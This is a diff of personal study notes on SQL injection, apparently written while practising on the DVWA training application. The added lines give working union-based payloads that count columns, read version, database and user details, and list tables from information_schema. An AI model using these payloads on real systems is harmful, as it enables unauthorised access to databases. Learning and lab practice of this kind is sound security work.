@@ -137,5 +137,10 @@ Spli
 	blind injection
 		1' order by 3#     #order by    is used to identify the nums of columns of the sheet. if the respnse of 3 is error,
 									the colume is less than 3.
-		union select 1,2#    # 1 and 2 can be functions to enquery info. like version(), database(),@@hostname. 内建函数， global var.
-
+		union select 1,2#    # 1 and 2 can be functions to enquery info. 
+					like version(), database(),user(),@@hostname. 内建函数， global var.
+					information_schema.tables , table_name
+		#to get the tables of the DB 
+			1' union select table_name,1 from information_schema.tables#
+		# table name of dvwa schema
+			1' union select table_name,1 from information_schema.tables where table_schema='dvwa'#
